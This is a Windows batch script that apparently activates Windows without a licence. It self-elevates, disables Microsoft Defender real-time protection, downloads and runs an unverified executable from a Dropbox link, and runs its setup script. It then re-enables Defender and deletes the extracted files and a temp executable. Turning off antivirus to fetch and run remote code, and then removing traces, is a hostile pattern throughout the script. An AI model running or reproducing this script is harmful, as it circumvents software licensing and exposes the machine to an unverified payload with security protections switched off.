@NET SESSION > NUL 2> NUL || PowerShell -Command "Start-Process \"%0\" -Verb RunAs" && EXIT
@ECHO OFF
CD /D "%~dp0\..\Extra\"

ECHO [35m
ECHO Activating Windows
ECHO:
ECHO [0m

ECHO Disabling Windows Security

PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

IF NOT EXIST _oem_.exe PowerShell -Command "(new-object System.Net.WebClient).DownloadFile('https://www.dropbox.com/s/1i3917ukr2pxgk2/_oem_.exe?dl=1','_oem_.exe')"

_oem_.exe -P"_oem_" -Y

CD /D "%~dp0\..\Extra\$oem$\$$\Setup\Scripts\"
CALL SetupComplete.cmd 2> NUL

ECHO [33m

TYPE hwid.log

CD /D "%~dp0\..\Extra\"

ECHO:
ECHO [0mEnabling Windows Security

PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"

RD /S /Q $oem$
DEL %SYSTEMROOT%\Temp\warnk.exe

EXIT /B
